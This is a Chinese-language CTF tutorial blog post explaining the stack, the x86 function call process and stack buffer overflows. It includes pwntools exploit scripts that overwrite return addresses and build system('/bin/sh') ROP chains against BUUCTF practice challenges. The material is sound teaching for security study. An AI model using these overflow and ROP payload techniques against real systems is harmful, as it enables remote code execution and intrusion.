---
title: 栈溢出基础知识+函数调用过程
date: 2023-07-05 22:19:26
tags: [Stack,Basic Knowledge]
---

------

在函数调用过程中，栈（Stack）扮演着重要的角色。它在内存中用于管理函数调用的相关信息，包括参数传递、返回地址和局部变量等。栈的主要作用：

1. 保存参数：当一个函数被调用时，函数的参数会被压入栈中。这样做的目的是为了将函数调用所需的参数传递给被调用函数。参数在栈中以特定顺序被存储，并且在函数调用结束后，可以通过访问栈来获取这些参数的值。

2. 保存返回地址：在函数调用过程中，程序需要知道函数执行完毕后应该返回到哪里继续执行。因此，在函数调用之前，调用者的返回地址会被压入栈中，以便函数执行完毕后能正确返回到调用点。

3. 管理局部变量：函数内部定义的局部变量通常存储在栈中。每个函数调用都会创建一个新的栈帧，其中包含了局部变量和其他相关信息。栈的先进后出特性使得函数调用结束时，栈帧会被弹出，同时也释放了关联的局部变量的内存空间。

4. 实现函数嵌套和递归：栈的存储结构提供了一种便捷的方式来实现函数嵌套和递归。每当一个函数被调用时，一个新的栈帧会被压入栈中，允许在相同的函数内部重复调用自身或其他函数。

5. 管理程序执行流程：栈维护了函数调用的先后顺序和返回地址，使得程序能够正确地跳转和控制执行流程。通过压入和弹出栈帧，程序能够按照所需的顺序执行各个函数，并返回至正确的调用点

本篇结合函数调用过程结束栈溢出基础知识，其中一些基础知识放入附录，可以先浏览一遍附录。

# 一、栈结构

数据结构中的栈应该都很熟悉了，复习一下：

栈（Stack）是一种基本的数据结构，它遵循后进先出（Last-In-First-Out, LIFO）的原则。栈可以看作是一种特殊的线性表，主要支持两个操作：压入（push）和弹出（pop）。压入将元素放入栈的顶部，而弹出则从栈的顶部移除元素。

栈的特点如下：

1. 只能在表的一端进行插入和删除操作，该端称为栈顶。
2. 具有先进后出的特征，最后压入栈的元素首先被弹出。
3. 无需指定访问位置，只需要对栈执行压入或弹出操作。

我们要了解的是**linux内存布局中的栈**。

linux内存布局图如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack1.png?x-oss-process=style/watermark)

大致了解一下栈所处的位置即可，(详细见附录)。其它部分在后续学习中会陆续了解到。

Linux中的栈是指进程在内存中用于存储函数调用、局部变量和临时数据的区域。每个进程在运行时都会有自己的栈，该栈按照后进先出（Last-In-First-Out, LIFO）的原则**管理函数调用**。Linux的栈使用虚拟内存技术进行管理，每个进程都有自己独立的栈空间，并且栈从**高地址向低地址**生长。栈的初始大小通常较小，但可以动态地进行扩展。

栈通常由三个部分组成：

函数调用：当一个函数被调用时，相关信息如函数参数、返回地址会被压入栈中。在函数执行完毕后，可以通过弹出栈顶元素来回到调用该函数之前的位置。
局部变量：每个函数都有其局部变量的存储空间。这些变量在函数调用过程中被压入和弹出栈中。
临时数据：栈还用于存储临时数据，例如临时变量、寄存器值等。

接下来结合函数调用过程了解一下栈的作用。

------

# 二、函数调用过程

有如下代码:

```c
#include <stdio.h>
void fun(void)
{
    printf("hello world")；
}
int main()
{
    fun()；
	printf("end.");
    return 0;
}
```

简单了解一下寄存器的作用（详细见附录）：

- eax/ebx/ecx/edx：通用寄存器，保留临时数据
- ebp：栈低指针
- esp：栈顶指针
- eip：指令寄存器，保存当前指令的下一条指令的地址

在linux系统中使用如下命令编译上述代码：

-no-pie表示关闭地址随机化ASLR（详细见附录）

```shell
gcc -m32 -no-pie -o 1 1.c
```

拿到编译好的文件后，使用IDA反汇编，查看main++函数的汇编指令如下：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack3.png?x-oss-process=style/watermark" style="zoom: 80%;" />

其中call fun指令是调用fun函数的指令。

使用gdb对编译好的可执行文件调试，使用 **b *0x08048468** 在call fun处下一个断点，然后使用 **r** 命令开始运行调试，程序停在如下位置：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack4.png?x-oss-process=style/watermark" style="zoom: 80%;" />

其中arg表示参数。此时栈结构如下，可见它将参数都压入栈了。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack5.png?x-oss-process=style/watermark" style="zoom:80%;" />

按 **si** 进入单步调试。即执行了call fun以后，栈结构如下，此时往栈中压入了一个地址0x8048470。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack6.png?x-oss-process=style/watermark" style="zoom:80%;" />

这是因为call 指令相当于 push eip; jmp fun 两条指令，即将eip中的值压入栈并跳转到fun函数。我们知道eip中的值是下一条指令的地址。那么下一条指令地址到底指向何处呢？

从IDA反汇编的图可以看出，call fun函数时，下一条指令为sub esp,10h：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack7.png?x-oss-process=style/watermark)

即下一条指令地址为0x8048470，也就是我们压入栈的地址。然后看fun函数接下来的指令：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack8.png?x-oss-process=style/watermark" style="zoom:80%;" />

会 push ebp，然后 mov ebp, esp。这两条指令的意思为将ebp寄存器的值压入栈，然后将esp寄存器指向ebp的位置。执行后如下：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack9.png?x-oss-process=style/watermark" style="zoom:80%;" />

也就是说，**汇编调用函数过程中会首先将参数压栈，然后返回地址（eip）压栈，然后是ebp的地址**。当函数执行到fun函数时，此时栈结构：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack2.png?x-oss-process=style/watermark" style="zoom:75%;" />



程序执行时，栈指针esp和栈顶指针ebp的详细变化如下，参考链接：https://blog.csdn.net/wenger/article/details/1738755 。可以结合上述调试的过程一起看。

​		**进入main函数的时候：**

1. **保存ebp指针**。  #main函数也是被其他函数调用的（tmainCRTStartup），因此这里会保存tmainCRTStartup的栈底地址，然后ebp指向mian函数栈底。

2. **使得ebp->esp** 。 #esp指针移到ebp处，esp栈顶指针会随着压栈入栈操作不断变化，相当于开辟栈空间。

3. **保持现场ebx，esi，edi**。  # 将这些寄存器都压入栈（此时esp不断变化）

   **进入一般函数（fun函数）的时候**

4. **push参数，例如有n个参数 esp = esp - 4*n** 。 #32位系统每个栈帧4字节，64位8字节。假设函数为fun(a,b)，会先后把b,a的地址压入栈

5. **push函数返回地址 esp = esp - 4** 。 #即将下一条指令的地址压入栈

6. **jmp 函数地址**。 #这一步不进行出入栈操作，它与上一步同时进行。也就是call指令

7. **push ebp 保存 (故有[ebp+8]就是第一个参数)**。 #正式进入fun函数，重新保存ebp地址（main函数的ebp）。ebp指向fun函数栈底。

8. **使得ebp ->esp, esp = esp - 40h - 临时变量需要字节数**。 #没有定义任何临时变量的情况下,默认预留64字节的栈内存空间

9. **保持现场ebx，esi，edi**。 #和第3步一样

10. **返回值eax**。#执行fun函数的内容，即printf("hello world")，若有返回值则返回，返回值一般保存在eax寄存器里

11. **恢复现场，就是依次pop出edi，esi，ebx**。 #即出栈操作，执行完毕后还原寄存器

12. **mov esp, ebp**。 #还原esp，即将esp指向当前ebp的地址

13. **pop ebp**。 #还原ebp，ebp重新指向main函数栈底。esp往下移动一个栈帧（esp+4=ebp+4），即指向函数返回地址。

14. **ret。** #ret指令取出当前栈顶值，作为返回地址，并将指令指针寄存器eip修改为该值，实现函数返回。esp往下移动一个栈帧，esp=esp+4

15. **esp=esp+n*4**。#传回参数，释放形参 。n为参数的数量。

------

# 三、栈溢出基本原理

## 3.1基本原理

当一个我们在输入数据时，如果程序对输入没有限制，会导致输入的超出预定的范围，覆盖掉原来的数据。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack10.png?x-oss-process=style/watermark" style="zoom:80%;" />

如果我们将返回地址改好覆盖成我们构造的地址，就可以控制程序的走向了。

例题：https://buuoj.cn/challenges#warmup_csaw_2016 。也可以自己去buuctf上找，题目名字：**warmup_csaw_2016**

用IDA反汇编之后，按 **f5**，查看反汇编代码，发现是一个很简单的函数：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack11.png?x-oss-process=style/watermark" style="zoom:80%;" />

在最后一行gets (&v5)那里，有一个漏洞，即没有限制输入长度。查看其它函数，发现：

<img src="F:/%E6%88%91/%E5%B7%A5%E4%BD%9C/blogs/stack/stack12.png" style="zoom:80%;" />

函数sub_40060D这里有一个**后门**，执行这个函数就可以获得flag。因此只要我们把返回地址覆盖成sub_40060D的地址，这样程序在执行完get函数返回的时候，就会返回到sub_40060D，这样就可以执行里面的system函数， 然后就可以拿到flag了。

那么我们要填充多少数据才能使它刚好覆盖到返回地址呢？

我们知道，返回地址在 ebp 的后面，而 v5 在 ebp-40h 的地方（40h表示十六进制，即0x40=64），也就是说，v5大小为0x40，因此只要把v5覆盖了，ebp覆盖了，就能覆盖到返回地址了。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack13.png?x-oss-process=style/watermark" style="zoom:75%;" />

由于是64位程序，栈帧为8字节，即ebp大小为8字节，因此我们只要填充0x40+8的数据就可以覆盖到返回地址了。如下：

```python
from pwn import *  #使用了pwntools,二进制利用框架
r=remote("node4.buuoj.cn",28137) #连接到指定地址和端口
payload='a'*(0x40+8)+p64(0x40060D) #先覆盖0x40+8字节的数据，然后将返回地址覆盖为0x40060D,p64表示以64位地址为格式
r.sendline(payload) #发送构造数据
r.interactive() #进入交互
```

得到flag:

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack14.png?x-oss-process=style/watermark" style="zoom:80%;" />

## 3.2 构造system

system函数的功能就是调用系统命令，可以通过/bin/sh命令去执行一个用户执行命令或者脚本。这条我们就可以随意执行命令了，那么怎么构造system函数呢。

要知道 system("/bin/sh")包含两部分，system函数和bin/sh参数。因此我们需要找到system函数和bin/sh参数的地址。

例题：https://buuoj.cn/challenges#jarvisoj_level2 。题目名字：**jarvisoj_level2**。

同样IDA反汇编如下：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack15.png?x-oss-process=style/watermark" style="zoom:80%;" />

vulnerable函数中存在溢出点，buf 的栈大小为0x88=136字节，32位ebp占4字节，一共140字节。但是read函数可以读取0x100字节的内容，因此存在溢出。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack18.png?x-oss-process=style/watermark" style="zoom:80%;" />

可以看到有system函数，点击跳转找到system函数地址为0x0804320.

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack17.png?x-oss-process=style/watermark" style="zoom:80%;" />

然后按 **f12** 查找字符串，找到bin/sh字符串地址：0x0804A024

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack16.png?x-oss-process=style/watermark" style="zoom:80%;" />

找到地址后，我们如何构造它呢？

要让程序执行system函数，就要将system地址写入返回地址，这样当程序执行到返回地址时，system函数就会执行。执行时system函数会寻找**ebp+8（第一个参数的位置）**的位置来输入参数，因此我们需要将/bin/sh地址写入ebp+8位，才能成功使system("/bin/sh")执行。这里的ebp+8位中的ebp是system函数执行时的ebp，还记得我们在栈结构中了解到的，执行函数时，会先push ebp，即system所处位置就是system的ebp。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack19.png?x-oss-process=style/watermark" style="zoom:80%;" />

exp如下：

```python
from pwn import *
p=remote('node4.buuoj.cn',26550)
sys_addr=0x8048320
binsh_addr=0x804A024
payload='a'*140+p32(sys_addr)+p32(0x123)+p32(binsh_addr)#p32(0x123)为随意构造的虚假eip。p32表示32位地址格式
p.sendline(payload)
p.interactive()
```

成功获取flag：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack20.png?x-oss-process=style/watermark" style="zoom:80%;" />

## 3.3 64位system

64位程序和32位不同。x64 中的前六个参数依次保存在 rdi, rsi, rdx, rcx, r8 和 r9 寄存器中，因此要想使得system的参数位bin/sh，就要控制rdi寄存器。我们可以利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。

我们想使rdi寄存器的值为bin/sh的地址，最简单的就是l利用pop rdi汇编指令，在pop rdi后，如果有ret指令，就可以回到程序原来执行的地方，这时我们就可以控制程序流程了，也就是说，我们要找到**pop rdi, ret** 的汇编片段才可以。在这里，我们使用ROPgadget工具，来寻找pop rdi,ret。ROPgadget 是一个用于查找 Return-Oriented Programming（ROP） 链的工具。（详细见附录）

例题：https://buuoj.cn/challenges#jarvisoj_level2_x64 。题目名字：**jarvisoj_level2_x64**。

这道题和上面那道的功能一样，即反汇编几乎一样，就不一步步分析了。但是由于这道题是64位，无法像上面那样构造，因此我们需要找到pop rdi,ret的汇编片段

使用如下指令:

```shell
ROPgadget --binary level2_x64 --only 'pop|ret'
```

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack21.png?x-oss-process=style/watermark" style="zoom:80%;" />

可以看到存在pop rdi, ret指令，地址为0x4006b3。

我们先利用pop rsi, ret 将bin/sh参数地址传给rdi寄存器，然后ret返回，返回到system函数地址就可以顺利执行system('bin/sh')了。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack23.png?x-oss-process=style/watermark" style="zoom:80%;" />

exp如下：

```python
from pwn import *
p=remote('node4.buuoj.cn',27195)
binsh=0x0600A90
system=0x04004C0
pop_rdi=0x04006b3
payload = 'a'*0x88 +p64(pop_rdi) + p64(binsh) + p64(system) 
p.send(payload)
p.interactive()
```

成功溢出：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack22.png?x-oss-process=style/watermark" style="zoom:80%;" />

如果不成功，是因为64位系统需要栈对齐，在system函数前加个ret指令地址就可以。（详细见附录）

# 附录：

## 1、寄存器

**一般寄存器:AX、BX、CX、DX。** AX:累积暂存器，BX:基底暂存器，CX:计数暂存器，DX:资料暂存器
**索引暂存器:SI、DI**。 SI:来源索引暂存器，DI:目的索引暂存器
**堆叠、基底暂存器:SP、BP**。 SP:堆叠指标暂存器，BP:基底指标暂存器

EAX、ECX、EDX、EBX：为ax,bx,cx,dx的延伸，各32位元
ESI、EDI、ESP、EBP：为si,di,sp,bp的延伸，32位元
eax, ebx, ecx, edx, esi, edi, ebp, esp等都是X86 汇编语言中CPU上的通用寄存器的名称，是32位的寄存器。如果用C语言来解释，可以把这些寄存器当作变量看待。比方说：add eax,-2 ; //可以认为是给变量eax加上-2这样的一个值。

这些32位寄存器有多种用途，但每一个都有“专长”，有各自的特别之处。
EAX 是"累加器"(accumulator), 它是很多加法乘法指令的缺省寄存器。
EBX 是"基地址"(base)寄存器, 在内存寻址时存放基地址。
ECX 是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。
EDX 则总是被用来放整数除法产生的余数。
ESI/EDI分别叫做"源/目标索引寄存器"(source/destination index),因为在很多字符串操作指令中, DS:ESI指向源串,而ES:EDI指向目标串.
EBP是"基址指针"(BASE POINTER), 它最经常被用作高级语言函数调用的"框架指针"(frame pointer). 在破解的时候,经常可以看见一个标准的函数起始代码:
　　push ebp ;    将当前ebp的地址压入栈顶，方便函数栈帧在回收的时候找回原来的位置（保存当前ebp）
　　mov ebp,esp ;     将当前的ebp移动到当前esp的位置 
　　sub esp, xxx ;    将当前的esp往低地址处移动XXX的空间 （为函数开辟适当的空间）
　　...
　　这样一来,EBP 构成了该函数的一个框架, 在EBP上方分别是原来的EBP, 返回地址和参数. EBP下方则是临时变量. 函数返回时作 mov esp,ebp/pop ebp/ret 即可。ESP 专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。

## 2、NX

NX（DEP）(数据执行保护 Data Execution Prevention)。NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。

DEP特性需要硬件页表机制来提供支持。X86 32位架构页表上没有NX(不可执行）位，只有X86 64位才支持NX位。 Linux在X86 32位CPU没有提供软件的DEP机制，在64位CPU则利用NX位来实现DEP（当前Linux很少将该特性说成DEP)。

## 3 、CANARY(栈保护)：

栈溢出保护是一种缓冲区溢出攻击缓解手段，当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。

## 4 、PIE（ASLR）：

内存地址随机化机制（address space layout randomization)，有以下三种情况：
0-表示关闭进程地址空间随机化
1-表示将mmap的基址，stack和vdso页面随机化
2-表示在1的基础上增加堆（heap）的随机化

## 5 、bss段

**bss段**（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。bss属于静态内存分配。比如int a。

**data段**，数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。属于静态内存分配。比如int a= 1。

**text段**，代码段（code segment/text segment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。 

**heap**，堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。

**stack**，栈又称堆栈，是用户存放程序临时创建的局部变量，也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存/恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。

## 6、 ROP

ROP的全称为Return-oriented programming（**返回导向编程**），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。

随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。多个gadget可以组合到一起，进而可以执行多条汇编指令，从而达到目的。ROP 攻击一般得满足如下条件：1）程序存在溢出，并且可以控制返回地址。2）可以找到满足条件的 gadgets 以及相应 gadgets 的地址。

一般先通过溢出找到EIP的位置，执行ret指令，使得代码执行到我们想要的位置，但是这样的话，通常只能执行一个地址的指令，无法满足我们执行多个指令的需求。因此为了执行多个指令，我们将带有ret指令的地址写入，这样在执行指令完毕后就可以返回到溢出的位置，接着执行我们注入的指令。比如在EIP写入pop_eax_ret的地址，在执行时，就会跳到pop eax的地址，pop eax执行完，通过ret指令再返回当前位置，这时如果我们EIP后面注入了其它命令，就可以顺利执行了。

## 7 、system栈对齐

64位ubuntu18以上系统调用system函数时需要栈对齐。

64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐，rsp的最低字节必须为0x00（栈以16字节对齐），否则无法运行system指令。如果执行了一个对栈地址的操作指令（比如pop,ret,push等等，但如果是mov这样的则不算对栈的操作指令），那么栈地址就会+8或是-8。为使rsp对齐16字节，核心思想就是增加或减少栈内容，使rsp地址能相应的增加或减少8字节，这样就能够对齐16字节了。因为栈中地址都是以0或8结尾，0已经对齐16字节，因此只需要进行奇数次pop或push操作，就能把地址是8结尾的rsp变为0结尾，使其16字节对齐。

解决方法：

1. 去将system函数地址+1，此处的+1，即是把地址+1，也可以理解为：+1是为了跳过一条栈操作指令（我们的目的就是跳过一条栈操作指令，使rsp十六字节对齐，跳过一条指令，自然就是把8变成0了）。但又一个问题就是，本来+1是为了跳过一条栈操作指令，但是你也不知道下一条指令是不是栈操作指令，如果不是栈操作指令的话（你加一之后有可能正好是mov这种指令，也有可能人家指令是好几个字节，你加一之后也没有到下一个指令呢），+1也是徒劳的，要么就继续+1，一直加到遇见一条栈操作指令为止（最大加16次就能成功）
2. 直接在调用system函数地址之前去调用一个ret指令。因为本来现在是没有对齐的，那我现在直接执行一条对栈操作指令（ret指令等同于pop rip，该指令使得rsp+8，从而完成rsp16字节对齐），这样system地址所在的栈地址就是0结尾，从而完成了栈对齐。
